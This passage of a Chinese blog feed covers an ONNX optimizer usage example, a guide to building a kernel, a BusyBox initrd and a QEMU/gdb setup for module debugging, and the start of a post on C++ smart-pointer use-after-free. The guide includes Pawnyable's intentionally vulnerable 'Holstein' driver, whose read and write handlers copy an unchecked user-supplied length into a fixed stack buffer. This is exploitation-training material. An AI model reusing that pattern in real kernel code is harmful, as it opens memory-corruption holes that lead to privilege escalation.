</code></pre></div></div> <p>可以看出项目比较紧凑（小） 了解构建模式之前，可以先看看给出的使用示例</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// onnx_optimizer_exec.cpp</span>

<span class="cm">/*
 * SPDX-License-Identifier: Apache-2.0
 */</span>
<span class="p">...</span>

  <span class="k">try</span> <span class="p">{</span>
    <span class="n">ONNX_NAMESPACE</span><span class="o">::</span><span class="n">ModelProto</span> <span class="n">model</span><span class="p">;</span>
    <span class="n">onnx</span><span class="o">::</span><span class="n">optimization</span><span class="o">::</span><span class="n">loadModel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">model</span><span class="p">,</span> <span class="n">model_in_path</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
    <span class="n">onnx</span><span class="o">::</span><span class="n">checker</span><span class="o">::</span><span class="n">check_model</span><span class="p">(</span><span class="n">model</span><span class="p">);</span>
    <span class="k">auto</span> <span class="n">new_model</span> <span class="o">=</span> <span class="n">onnx</span><span class="o">::</span><span class="n">optimization</span><span class="o">::</span><span class="n">Optimize</span><span class="p">(</span>
        <span class="n">model</span><span class="p">,</span> <span class="n">onnx</span><span class="o">::</span><span class="n">optimization</span><span class="o">::</span><span class="n">GetFuseAndEliminationPass</span><span class="p">());</span>
    <span class="n">onnx</span><span class="o">::</span><span class="n">checker</span><span class="o">::</span><span class="n">check_model</span><span class="p">(</span><span class="n">new_model</span><span class="p">);</span>
    <span class="kt">bool</span> <span class="n">save_external_data</span> <span class="o">=</span> <span class="o">!</span><span class="n">model_data_path</span><span class="p">.</span><span class="n">empty</span><span class="p">();</span>
    <span class="n">onnx</span><span class="o">::</span><span class="n">optimization</span><span class="o">::</span><span class="n">saveModel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_model</span><span class="p">,</span> <span class="n">model_out_path</span><span class="p">,</span>
                                  <span class="n">save_external_data</span><span class="p">,</span> <span class="n">model_data_path</span><span class="p">);</span>

  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">exception</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">e</span><span class="p">.</span><span class="n">what</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">...</span>

</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">ModelProto</code>: 继承于<code class="language-plaintext highlighter-rouge">::google::protobuf::Message</code>, 用于模型的存储，修改以及基于<code class="language-plaintext highlighter-rouge">protobuf</code>进行序列化, 由ONNX提供</li> <li><code class="language-plaintext highlighter-rouge">loadModel</code>: ONNX-opt提供，当true时，在模型文件同文件夹下寻找并加载额外文件（权重），并调用<code class="language-plaintext highlighter-rouge">loadExternalDataForTensor</code>，转化为tensor形式</li> <li><code class="language-plaintext highlighter-rouge">check_model</code>：按照ONNX标准进行检查</li> <li><code class="language-plaintext highlighter-rouge">saveModel</code>: 保存模型和权重</li> <li><code class="language-plaintext highlighter-rouge">onnx::optimization::Optimize/OptimizeFixed</code>: 优化过程分为常规优化和不动点优化，这两个接口将会被导出到python（需安装pybind11）</li> </ul>]]></content><author><name>久菜合子</name></author><category term="dev"/><category term="nn"/><category term="onnx"/><category term="ai-compiler"/><summary type="html"><![CDATA[今天是人类目前最大的湿件制导导弹命中目标的24(man!)周年]]></summary></entry><entry><title type="html">内核模块开发环境及调试</title><link href="https://leakbox258.github.io/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/" rel="alternate" type="text/html" title="内核模块开发环境及调试"/><published>2025-02-24T00:00:00+00:00</published><updated>2025-02-24T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/"><![CDATA[<p>ps: OS课用</p> <h2 id="qemu虚拟机">Qemu虚拟机</h2> <h4 id="-qemu下载">  qemu下载</h4> <h5 id="直接apt下一个即可-建议使用模拟x86的qemu-这样可以避免使用交叉编译器">   直接apt下一个即可, 建议使用模拟x86的qemu, 这样可以避免使用交叉编译器<br/></h5> <h4 id="-direct-linux-boot">  Direct Linux Boot</h4> <h5 id="一方面-可以使用qemu-img制作一个镜像-然后用qemu模拟运行">   一方面, 可以使用<code class="language-plaintext highlighter-rouge">qemu-img</code>制作一个镜像, 然后用<code class="language-plaintext highlighter-rouge">qemu</code>模拟运行<br/></h5> <h5 id="qemu支持所谓直接引导linux内核direct-linux-boot的方式启动虚拟机-更适合内核的测试-httpswwwqemuorgdocsmastersystemlinuxboothtml">   <code class="language-plaintext highlighter-rouge">qemu</code>支持所谓”直接引导Linux内核(Direct Linux Boot)”的方式启动虚拟机, 更适合内核的测试 https://www.qemu.org/docs/master/system/linuxboot.html</h5> <h5 id="此种方式需要准备三个部分">   此种方式需要准备三个部分:</h5> <h5 id="1-一个压缩的linux内核镜像-俗称bzimage2-一个临时根文件系统initrd3指定根文件设备的挂载-如果initrd已经是一个可用的文件系统-则此处省略">    1. 一个压缩的Linux内核镜像, 俗称bzImage<br/>    2. 一个临时根文件系统initrd<br/>    3.指定根文件设备的挂载, 如果initrd已经是一个可用的文件系统, 则此处省略</h5> <h5 id="此外这种方式还支持gdb-attach-是之后主要的调试方法">    此外这种方式还支持<code class="language-plaintext highlighter-rouge">gdb-attach</code>, 是之后主要的调试方法</h5> <h2 id="准备开发环境">准备开发环境</h2> <h4 id="linux-headers"> linux-headers</h4> <h5 id="内核模块的编译和构建需要一些特定的宏-数据结构以及函数-这些东西常用的头文件中没有-需要下载专门的linux-headers">   内核模块的编译和构建需要一些特定的宏, 数据结构以及函数, 这些东西常用的头文件中没有, 需要下载专门的<code class="language-plaintext highlighter-rouge">linux-headers</code><br/></h5> <h5 id="如果你的apt或者别的什么包管理器可以直接下载对应版本的linux-headers-但极有可能是找不到的">   如果你的apt或者别的什么包管理器可以直接下载对应版本的<code class="language-plaintext highlighter-rouge">linux-headers</code>, 但极有可能是找不到的<br/></h5> <h5 id="首先从httpswwwkernelorg-下一个linux-61129tarxz-或者curl--o--l-httpsmirrorstunatsinghuaeducnkernelv5xlinux-61129tarxz">   首先从https://www.kernel.org/, 下一个linux-6.1.129.tar.xz; 或者<code class="language-plaintext highlighter-rouge">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-6.1.129.tar.xz</code></h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ unxz linux-6.1.129.tar.xz
$ tar -xf linux-6.1.129.tar
</code></pre></div></div> <h5 id="进入源码目录之后-make-menuconfig进入图形化配置界面需要全屏-勾选以下内容">   进入源码目录之后, <code class="language-plaintext highlighter-rouge">make menuconfig</code>进入图形化配置界面(需要全屏), 勾选以下内容</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 便于调试
Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Debug information (Disable debug information) -&gt; Rely on the toolchain's implicit default DWARF version
Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger
# 兼容initrd
File systems -&gt; Second extended fs support -&gt; Ext2 extended attributes
</code></pre></div></div> <h5 id="然后执行make-prepare和make-modules_prepare-理论上只用make-modules_prepare即可-但是没试过">   然后执行<code class="language-plaintext highlighter-rouge">make prepare</code>和<code class="language-plaintext highlighter-rouge">make modules_prepare</code>, 理论上只用<code class="language-plaintext highlighter-rouge">make modules_prepare</code>即可, 但是没试过<br/></h5> <h5 id="然后执行make-modules--jnproc-这一步是主要为了生成modulesymvers-这样才能使用一些内核函数">   然后执行<code class="language-plaintext highlighter-rouge">make modules -j$(nproc)</code>, 这一步是主要为了生成<code class="language-plaintext highlighter-rouge">Module.symvers</code>, 这样才能使用一些内核函数<br/></h5> <h4 id="编译与构建举例"> 编译与构建举例</h4> <h5 id="以下是一个字符型内核模块的示例-模块名为holstein">   以下是一个字符型内核模块的示例, 模块名为holstein<br/></h5> <h5 id="来自httpspawnyablecafelinux-kernel">   来自https://pawnyable.cafe/linux-kernel/<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"ptr-yudai"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"Holstein v1 - Vulnerable Kernel Driver for Pawnyable"</span><span class="p">);</span>

<span class="cp">#define DEVICE_NAME "holstein"
#define BUFFER_SIZE 0x400
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">g_buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">module_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_open called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">g_buf</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"kmalloc failed"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">module_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span>
                           <span class="n">loff_t</span> <span class="o">*</span><span class="n">f_pos</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">kbuf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_read called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">memcpy</span><span class="p">(</span><span class="n">kbuf</span><span class="p">,</span> <span class="n">g_buf</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"copy_to_user failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">module_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
                            <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">f_pos</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">kbuf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_write called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">_copy_from_user</span><span class="p">(</span><span class="n">kbuf</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"copy_from_user failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">g_buf</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">module_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"module_close called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">kfree</span><span class="p">(</span><span class="n">g_buf</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">module_fops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">module_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">module_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">module_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">module_close</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">dev_t</span> <span class="n">dev_id</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">cdev</span> <span class="n">c_dev</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">module_initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">alloc_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">DEVICE_NAME</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARNING</span> <span class="s">"Failed to register device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">cdev_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">module_fops</span><span class="p">);</span>
  <span class="n">c_dev</span><span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cdev_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">,</span> <span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARNING</span> <span class="s">"Failed to add cdev</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">module_cleanup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">cdev_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">);</span>
  <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">module_initialize</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">module_cleanup</span><span class="p">);</span>
</code></pre></div></div> <h5 id="首先-为了简写include-需要配置includepath-具体因ide而异">   首先, 为了简写include, 需要配置includePath, 具体因IDE而异<br/></h5> <h5 id="然后-编写makefile-kernel-module的makefile有特殊语法">   然后, 编写Makefile, kernel Module的Makefile有特殊语法</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BUILD_DIR := build
obj-m := holstein.o
KBUILD_DIR := ../_kernel/linux-6.1.129
CFLAGS_holstein.o := -O0

all:
	@mkdir -p $(BUILD_DIR)
	$(MAKE) -C $(KBUILD_DIR) M=$(shell pwd) modules
	find . -maxdepth 1 -type f ! -name '*.ko' ! -name 'Makefile' ! -name '*.c' ! -name 'build' -exec mv {} build \;

clean:
	$(MAKE) -C $(KBUILD_DIR) M=$(shell pwd) clean

	rm -rf $(BUILD_DIR)
</code></pre></div></div> <h5 id="编译完成之后-出现的holsteinko就是编译后的模块">   编译完成之后, 出现的<code class="language-plaintext highlighter-rouge">holstein.ko</code>就是编译后的模块</h5> <h2 id="编译内核">编译内核</h2> <h5 id="在上述源码文件夹中-使用make-menuconfig配置之后-即可开始编译内核">   在上述源码文件夹中, 使用<code class="language-plaintext highlighter-rouge">make menuconfig</code>配置之后, 即可开始编译内核</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ make -j$(nproc) bzImage
</code></pre></div></div> <h5 id="编译完成之后-会通知镜像的路径">   编译完成之后, 会通知镜像的路径</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kernel: arch/x86/boot/bzImage is ready  (#1)
</code></pre></div></div> <h2 id="编译busybox">编译busybox</h2> <h5 id="现在还缺少一个initrd-使用busybox获取-通过busybox可以获取一个带文件系统的rootfs">   现在还缺少一个initrd, 使用busybox获取, 通过busybox可以获取一个带文件系统的rootfs<br/></h5> <h5 id="从httpsbusyboxnet-下载busybox源代码或者wget-httpsbusyboxnetdownloadsbusybox-1370tarbz2">   从<code class="language-plaintext highlighter-rouge">https://busybox.net/</code>, 下载busybox源代码或者<code class="language-plaintext highlighter-rouge">wget https://busybox.net/downloads/busybox-1.37.0.tar.bz2</code></h5> <h5 id="解压并配置">   解压并配置</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -vxf busybox-1.37.0.tar.bz2
cd busybox-1.37.0
make menuconfig
</code></pre></div></div> <h5 id="-setttings-选中-build-static-binary-no-shared-libs-使其编译成静态链接的文件-因为bzimage内核本身不提供glibc">    Setttings 选中 Build static binary (no shared libs), 使其编译成静态链接的文件, 因为bzImage内核本身不提供glibc<br/></h5> <h5 id="-然后执行make-install--jnproc-当前文件夹会出现名为_install的文件夹">    然后执行<code class="language-plaintext highlighter-rouge">make install -j$(nproc)</code>, 当前文件夹会出现名为<code class="language-plaintext highlighter-rouge">_install</code>的文件夹<br/></h5> <h5 id="进入文件夹-添加一些东西-并且把编译出的holsteinko放进去">   进入文件夹, 添加一些东西, 并且把编译出的<code class="language-plaintext highlighter-rouge">holstein.ko</code>放进去</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir -p  proc sys dev etc/init.d
</code></pre></div></div> <h5 id="在文件夹下新建一个init文件-写入如下内容作为初始化脚本-初始化系统环境-上面的新建文件夹的操作也可以放在这个脚本里">   在文件夹下新建一个<code class="language-plaintext highlighter-rouge">init</code>文件, 写入如下内容作为初始化脚本, 初始化系统环境, 上面的新建文件夹的操作也可以放在这个脚本里</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

echo "INIT SCRIPT"
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
insmod holstein.ko
setsid /bin/cttyhack setuidgid 1000 /bin/sh
</code></pre></div></div> <h5 id="然后打包">   然后打包</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd _install
$ find . | cpio -o --format=newc &gt; ../rootfs.cpio
</code></pre></div></div> <h5 id="获得一个rootfscpio">   获得一个<code class="language-plaintext highlighter-rouge">rootfs.cpio</code></h5> <h2 id="启动qemu">启动Qemu</h2> <h5 id="在做完了上述工作之后-编写一个用于启动qemu的脚本">   在做完了上述工作之后, 编写一个用于启动Qemu的脚本</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel ./bzImage-6.1 \
    -append "root=/dev/ram console=ttyS0 loglevel=3 oops=panic panic=1 pti=on nokaslr" \
    -no-reboot \
    -cpu kvm64 \
    -S \
    -gdb tcp::1234 \
    -smp cores=2,threads=1 \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -net nic,model=virtio \
    -net user \
    -enable-kvm \
</code></pre></div></div> <h5 id="看看模块是否挂上了">   看看模块是否挂上了</h5> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc3cd779db2.png" alt="Screenshot 2025-02-24 174107.png"/></p> <h5 id="由于权限不够-所以这里显示不了挂载到的地址">   由于权限不够, 所以这里显示不了挂载到的地址<br/></h5> <h2 id="调试">调试</h2> <h5 id="qemu的启动参数加上-append-nokaslr-关闭内核地址随机化-保证地址在每次启动之后保持不变">   <code class="language-plaintext highlighter-rouge">qemu</code>的启动参数加上<code class="language-plaintext highlighter-rouge">-append "nokaslr"</code>, 关闭内核地址随机化, 保证地址在每次启动之后保持不变</h5> <h5 id="在内核源码文件夹下有一个名为vmlinux的文件-是内核的符号表-用的上的用不上的都在里面">   在内核源码文件夹下有一个名为<code class="language-plaintext highlighter-rouge">vmlinux</code>的文件, 是内核的符号表, 用的上的用不上的都在里面.</h5> <h5 id="启动参数中的-gdb-tcp1234-指的是本地的端口12345--s参数会在qemu启动虚拟机后立即将其挂起-方便调试">   启动参数中的<code class="language-plaintext highlighter-rouge">-gdb tcp::1234</code>, 指的是本地的端口12345, <code class="language-plaintext highlighter-rouge">-S</code>参数会在qemu启动虚拟机后立即将其挂起, 方便调试<br/></h5> <h5 id="在另一个窗口中使用-加载符号表-下断点">   在另一个窗口中使用: 加载符号表, 下断点</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb -q -ex "target remote localhost:1234" 
(gdb) set architecture i386:x86-64 # 可选
(gdb) add-symbol-file vmlinux
(gdb) 
(gdb) b start_kernel
</code></pre></div></div> <h5 id="结果差不多是下面这种">   结果差不多是下面这种</h5> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc4a994eb6c.png" alt="63b68857-6543-4031-b299-d624a29bf77e.png"/></p> <h5 id="调试模块">   调试模块:</h5> <h5 id="init脚本改成root用户启动">   <code class="language-plaintext highlighter-rouge">init</code>脚本改成root用户启动</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setsid /bin/cttyhack setuidgid 0 /bin/sh
</code></pre></div></div> <h5 id="命令行获取模块加载地址">   命令行获取模块加载地址</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># lsmod
holstein 16384 0 - Live 0xffffffffc0000000 (O)
</code></pre></div></div> <h5 id="加载符号表-断点">   加载符号表, 断点</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) add-symbol-file holstein.ko 0xffffffffc0000000
(gdb) b module_read
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc621759279.png" alt="Screenshot 2025-02-24 202026.png"/></p> <h5 id="对照一下地址是否一致">   对照一下地址是否一致</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># grep module_read /proc/kallsyms
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/24/67bc625a75b11.png" alt="Screenshot 2025-02-24 202033.png"/></p> <h5 id="看起来有点蠢-但是也没找到更好的调试方法了">   看起来有点蠢, 但是也没找到更好的调试方法了<br/></h5> <h5 id="据说gef插件会方便一些">   据说gef插件会方便一些(</h5>]]></content><author><name>久菜合子</name></author><category term="env"/><category term="dev"/><summary type="html"><![CDATA[ps: OS课用]]></summary></entry><entry><title type="html">[水贴]C++应该怎么UAF</title><link href="https://leakbox258.github.io/blog/2025/C++%E6%80%8E%E4%B9%88UAF/" rel="alternate" type="text/html" title="[水贴]C++应该怎么UAF"/><published>2025-01-24T00:00:00+00:00</published><updated>2025-01-24T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/C++%E6%80%8E%E4%B9%88UAF</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/C++%E6%80%8E%E4%B9%88UAF/"><![CDATA[<p>ps1: UAF方法不全面, 没写不代表不能用或者没有<br/> ps2: 尽量避免裸指针出现, 只在模拟漏洞(各种任意写)时使用裸指针达到目的, 也就是非必要不用<code class="language-plaintext highlighter-rouge">.get()</code></p> <h2 id="智能指针">智能指针</h2> <h5 id="智能指针是c的常用特性之一-用于解决c语言以及早期c中的内存分配和释放过于复杂-或者内存泄露的问题一般使用的智能指针有stdunique_ptr-stdshared_ptr-stdweak_ptr-stdweak_ptr可以看作是stdshared_ptr在特定情况下的补充-需要include-memory然而-即使有智能指针-也不能高枕无忧-因为内存问题是所有人都要面对的-除非你是高贵的数据分析科学家-或者你使用语言yuan神rust下面简单列一下本人发现的可以对智能指针uaf的方法">   智能指针是C++的常用特性之一, 用于解决C语言以及早期C++中的内存分配和释放过于复杂, 或者内存泄露的问题.<br/>   一般使用的智能指针有<code class="language-plaintext highlighter-rouge">std::unique_ptr, std::shared_ptr, std::weak_ptr</code>, <code class="language-plaintext highlighter-rouge">std::weak_ptr</code>可以看作是<code class="language-plaintext highlighter-rouge">std::shared_ptr</code>在特定情况下的补充. 需要<code class="language-plaintext highlighter-rouge">#include &lt;memory&gt;</code>.<br/>   然而, 即使有智能指针, 也不能高枕无忧, 因为内存问题是所有人都要面对的, 除非你是高贵的数据分析科学家, 或者你使用语言(yu’an)神Rust<br/>   下面简单列一下本人发现的可以对智能指针UAF的方法.</h5> <h2 id="shared_ptr">shared_ptr</h2> <h3 id="内存回收方式"> 内存回收方式<br/></h3> <h5 id="shared_ptr是比较常用的智能指针-一块堆内存可以被多个若干个shared_ptr指向-这块内存会记录被指向的数目引用计数shared_count-当引用归零时-内存被释放-表面上看是这样的实际上stdmake_shared分配的内存有两个计数器-shared_count和weak_count各4字节-当然是为了配合weak_ptr使用">   <code class="language-plaintext highlighter-rouge">shared_ptr</code>是比较常用的智能指针, 一块堆内存可以被多个若干个<code class="language-plaintext highlighter-rouge">shared_ptr</code>指向, 这块内存会记录被指向的数目(引用计数shared_count), 当引用归零时, 内存被释放. 表面上看是这样的.<br/>   实际上<code class="language-plaintext highlighter-rouge">std::make_shared&lt;&gt;</code>分配的内存有两个计数器, <code class="language-plaintext highlighter-rouge">shared_count和weak_count</code>(各4字节), 当然是为了配合<code class="language-plaintext highlighter-rouge">weak_ptr</code>使用<br/></h5> <h5 id="那么shared_ptr在内存中是什么样的的组织方式-下面一个demo">   那么<code class="language-plaintext highlighter-rouge">shared_ptr</code>在内存中是什么样的的组织方式, 下面一个demo</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span 